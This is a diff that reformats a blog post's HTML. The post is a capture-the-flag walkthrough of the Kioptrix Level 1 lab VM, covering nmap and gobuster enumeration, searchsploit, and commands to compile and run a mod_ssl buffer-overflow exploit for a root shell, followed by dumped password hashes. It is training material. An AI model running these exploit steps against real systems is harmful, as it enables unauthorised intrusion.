@@ -1,4 +1,49 @@
-<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>मंथन | Manthan</title><link rel=icon type=image/webp sizes=32x32 href=/static/images/manthan-32x32.png.webp><link rel=stylesheet type=text/css media=screen href=/static/css/style.rainbow.css><link rel=stylesheet href=/static/css/atelier-forest-light.css><script charset=UTF-8 src=/static/js/highlight.min.js></script><script charset=UTF-8 src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script></head><body><div class=header><table><tr><td><a href=/index.html class=menu_home>मंथन</a></td><td> | </td><td><a href=/archive.html class=menu_archive>Archive</a></td><td> | </td><td><a href=/tags.html class=menu_tags>Tags</a></td><td> | </td><td><a href=/stats.html class=menu_stats>Stats</a></td></tr></table></div><div class=body><h1 class="h1 collapsible" onclick=toggle(this);>[VulnHub] Kioptrix: Level 1 (#1)</h1><p><a href=/posts/20190927_vulnhub-hackme.html> « </a>📅 published on <code>28/Sep/2019</code><a href=/posts/20190928_vulnhub-kioptrix2.html> » </a></p><h2 class="h2 collapsible" onclick=toggle(this);>Overview</h2><p class=nested>This is a writeup for VulnHub VM <a href=https://www.vulnhub.com/entry/kioptrix-level-1-1,22/ >Kioptrix: Level 1 (#1)</a>. Here are stats for this machine from <a href=https://github.com/7h3rAm/machinescli>machinescli</a>:</p><p class=nested><img alt=writeup.overview.machinescli src=/static/files/posts_vulnhub_kioptrix1/machinescli.png.webp></p><h3 class="h3 collapsible" onclick=toggle(this);>Killchain</h3><p class=nested>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p><p class=nested><img alt=writeup.overview.killchain src=/static/files/posts_vulnhub_kioptrix1/killchain.png.webp></p><h3 class="h3 collapsible" onclick=toggle(this);>TTPs</h3><p class=nested>1. <code>443/tcp/ssl/https/Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</code>: <a href=https://github.com/7h3rAm/writeups#exploit_modssl>exploit_modssl</a>, <a href=https://github.com/7h3rAm/writeups#privesc_modssl>privesc_modssl</a> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #1: Enumeration</h2><p class=nested>1. Here's the Nmap scan result: </p><pre class=nested><code># Nmap 7.70 scan initiated Fri Sep 27 15:42:00 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix1/results/192.168.92.181/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix1/results/192.168.92.181/scans/xml/_quick_tcp_nmap.xml 192.168.92.181
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
+    <meta name="description" content="Personal Weblog"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+    <title>मंथन | Manthan</title>
+    <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
+    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.rainbow.css"/>
+    <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
+    <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github-gist.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
+    <script charset="UTF-8" src="/static/js/highlight.min.js"></script>
+    <script charset="UTF-8" src="/static/js/highlightjs-line-numbers.min.js"></script>
+    <script charset="UTF-8" src="/static/js/go.min.js"></script>
+   </head>
+  <body>
+    <div class="header">
+      <table>
+        <tr>
+          <td><a href="/index.html" class="menu_home">मंथन</a></td><td> | </td>
+          <td><a href="/archive.html" class="menu_archive">Archive</a></td><td> | </td>
+          <td><a href="/tags.html" class="menu_tags">Tags</a></td><td> | </td>
+          <td><a href="/stats.html" class="menu_stats">Stats</a></td>
+        </tr>
+      </table>
+    </div>
+    <div class="body">
+          <h1>[VulnHub] Kioptrix: Level 1 (#1)</h1>
+                  <p><a href="/posts/20190927_vulnhub-hackme.html"> « </a>📅 published on <code>28/Sep/2019</code><a href="/posts/20190928_vulnhub-kioptrix2.html"> » </a></p>
+                <h2>Overview</h2>
+<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Kioptrix: Level 1 (#1)</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
+<p><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_kioptrix1/machinescli.png.webp" /></p>
+<h3>Killchain</h3>
+<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
+<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_kioptrix1/killchain.png.webp" /></p>
+<h3>TTPs</h3>
+<p>1. <code>443/tcp/ssl/https/Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</code>: <a href="https://github.com/7h3rAm/writeups#exploit_modssl">exploit_modssl</a>, <a href="https://github.com/7h3rAm/writeups#privesc_modssl">privesc_modssl</a>  </p>
+<h2>Phase #1: Enumeration</h2>
+<p>1. Here's the Nmap scan result:  </p>
+<pre><code># Nmap 7.70 scan initiated Fri Sep 27 15:42:00 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix1/results/192.168.92.181/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix1/results/192.168.92.181/scans/xml/_quick_tcp_nmap.xml 192.168.92.181
 Nmap scan report for 192.168.92.181
 Host is up, received arp-response (0.0011s latency).
 Scanned at 2019-09-27 15:42:01 PDT for 273s
@@ -75,27 +120,48 @@ Host script results:
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri Sep 27 15:46:34 2019 -- 1 IP address (1 host up) scanned in 274.07 seconds
-</code></pre><p class=nested>2. Here a summary of open ports and associated <a href=https://github.com/Tib3rius/AutoRecon>AutoRecon</a> scan files:</p><p class=nested><img alt=writeup.enumeration.steps.2.1 src=/static/files/posts_vulnhub_kioptrix1/openports.png.webp> </p><p class=nested>3. We explore the various directories and files found with <code>gobuster</code> scan but nothing interesting is found: </p><pre class=nested><code>gobuster -u http://192.168.92.181:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s &quot;200,204,301,302,307,401,403&quot; -x &quot;txt,html,php,asp,aspx,jsp&quot;
+</code></pre>
+<p>2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
+<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_kioptrix1/openports.png.webp" />  </p>
+<p>3. We explore the various directories and files found with <code>gobuster</code> scan but nothing interesting is found:  </p>
+<pre><code>gobuster -u http://192.168.92.181:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s &quot;200,204,301,302,307,401,403&quot; -x &quot;txt,html,php,asp,aspx,jsp&quot;
   http://192.168.92.181:80/index.html (Status: 200) [Size: 2890]
   http://192.168.92.181:80/manual (Status: 301)
   http://192.168.92.181:80/mrtg (Status: 301)
   http://192.168.92.181:80/test.php (Status: 200) [Size: 27]
   http://192.168.92.181:80/usage (Status: 301)
-</code></pre><p class=nested>4. We fallback on Nmap version detection for <code>443/tcp</code> and search exploits for <code>Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</code> using <code>searchsploit</code>: </p><pre class=nested><code>searchsploit mod_ssl
+</code></pre>
+<p>4. We fallback on Nmap version detection for <code>443/tcp</code> and search exploits for <code>Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</code> using <code>searchsploit</code>:  </p>
+<pre><code>searchsploit mod_ssl
   Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)  | exploits/unix/remote/47080.c
-</code></pre><p class=nested><img alt=writeup.enumeration.steps.4.1 src=/static/files/posts_vulnhub_kioptrix1/screenshot01.png.webp> </p><h3 class="h3 collapsible" onclick=toggle(this);>Findings</h3><h4 class="h4 collapsible" onclick=toggle(this);>Open Ports</h4><pre class=nested><code>22/tcp    |  ssh          |  OpenSSH 2.9p2 (protocol 1.99)
+</code></pre>
+<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_kioptrix1/screenshot01.png.webp" />  </p>
+<h3>Findings</h3>
+<h4>Open Ports</h4>
+<pre><code>22/tcp    |  ssh          |  OpenSSH 2.9p2 (protocol 1.99)
 80/tcp    |  http         |  Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
 111/tcp   |  rpcbind      |  2 (RPC #100000)
 137/udp   |  netbios-ns   |  Samba nmbd netbios-ns (workgroup: MYGROUP)
 139/tcp   |  netbios-ssn  |  Samba smbd (workgroup: HMYGROUP)
 443/tcp   |  ssl/https    |  Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
 1024/tcp  |  status       |  1 (RPC #100024)
-</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2: Exploitation</h2><p class=nested>1. We compile this exploit and check it's usage options. It requries a platform specific offset and provides mapping of supported offsets. We determine the required offset value for our target to be <code>0x6b</code> based on the Nmap version detection results for <code>443/tcp</code>. Once executed, the exploit successfully establishes an elevated, remote session with the target: </p><pre class=nested><code>gcc -o 47080 47080.c -lcrypto
+</code></pre>
+<h2>Phase #2: Exploitation</h2>
+<p>1. We compile this exploit and check it's usage options. It requries a platform specific offset and provides mapping of supported offsets. We determine the required offset value for our target to be <code>0x6b</code> based on the Nmap version detection results for <code>443/tcp</code>. Once executed, the exploit successfully establishes an elevated, remote session with the target:  </p>
+<pre><code>gcc -o 47080 47080.c -lcrypto
 ./47080
   0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
 ./47080 0x6b 192.168.92.181 443
-</code></pre><p class=nested><img alt=writeup.exploitation.steps.1.1 src=/static/files/posts_vulnhub_kioptrix1/screenshot02.png.webp> </p><p class=nested><img alt=writeup.exploitation.steps.1.2 src=/static/files/posts_vulnhub_kioptrix1/screenshot03.png.webp> </p><p class=nested><img alt=writeup.exploitation.steps.1.3 src=/static/files/posts_vulnhub_kioptrix1/screenshot04.png.webp> </p><p class=nested>2. We can now read the <code>/var/mail/root</code> file to complete the challenge: </p><pre class=nested><code>cat /var/mail/root
-</code></pre><p class=nested><img alt=writeup.exploitation.steps.2.1 src=/static/files/posts_vulnhub_kioptrix1/screenshot05.png.webp> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2.5: Post Exploitation</h2><pre class=nested><code>root@kioptrix.level1&gt; id
+</code></pre>
+<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_kioptrix1/screenshot02.png.webp" />  </p>
+<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_kioptrix1/screenshot03.png.webp" />  </p>
+<p><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_vulnhub_kioptrix1/screenshot04.png.webp" />  </p>
+<p>2. We can now read the <code>/var/mail/root</code> file to complete the challenge:  </p>
+<pre><code>cat /var/mail/root
+</code></pre>
+<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_kioptrix1/screenshot05.png.webp" />  </p>
+<h2>Phase #2.5: Post Exploitation</h2>
+<pre><code>root@kioptrix.level1&gt; id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 root@kioptrix.level1&gt;  
 root@kioptrix.level1&gt; uname
@@ -113,7 +179,37 @@ eth0  Link encap:Ethernet  HWaddr 00:0C:29:45:0D:56
 root@kioptrix.level1&gt;  
 root@kioptrix.level1&gt; users
 root
-</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Loot</h2><h3 class="h3 collapsible" onclick=toggle(this);>Hashes</h3><pre class=nested><code>root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:............
+</code></pre>
+<h2>Loot</h2>
+<h3>Hashes</h3>
+<pre><code>root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:............
 john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:............
 harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:............
-</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>References</h2><ul class=nested><li><a href=https://www.vulnhub.com/entry/kioptrix-level-1-1,22/ >https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</a> </li><li><a href=https://medium.com/@bondo.mike/vulnhub-kioptrix-level-1-d439aa7039b2>https://medium.com/@bondo.mike/vulnhub-kioptrix-level-1-d439aa7039b2</a> </li><li><a href=https://n0tty.github.io/2017/02/25/kioptrix-1/ >https://n0tty.github.io/2017/02/25/kioptrix-1/</a> </li></ul><p style=text-align:center;>(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>« <a href=/posts/20190927_vulnhub-hackme.html>[VulnHub] hackme: 1...</a> « | » <a href=/posts/20190928_vulnhub-kioptrix2.html>[VulnHub] Kioptrix: Level 1.1 ...</a> »</p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script><script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script><script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script><div class="footer footercenter"><span><a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a></span></div></body></html>
+</code></pre>
+<h2>References</h2>
+<ul>
+<li><a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</a>  </li>
+<li><a href="https://medium.com/@bondo.mike/vulnhub-kioptrix-level-1-d439aa7039b2">https://medium.com/@bondo.mike/vulnhub-kioptrix-level-1-d439aa7039b2</a>  </li>
+<li><a href="https://n0tty.github.io/2017/02/25/kioptrix-1/">https://n0tty.github.io/2017/02/25/kioptrix-1/</a>  </li>
+</ul>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20190927_vulnhub-hackme.html">[VulnHub] hackme: 1...</a> « | » <a href="/posts/20190928_vulnhub-kioptrix2.html">[VulnHub] Kioptrix: Level 1.1 ...</a> »</p>
+            </div>
+    <div class="footer footercenter">
+      <span>
+        <a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a>
+      </span>
+    </div>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script>hljs.initLineNumbersOnLoad();</script>
+    <script>
+      function toggle(s){
+        s.classList.toggle("expanded");
+        for(var l=s.nextElementSibling;l;){
+          l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
+        }
+      }
+    </script>
+    <script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script>
+  </body>
+</html>
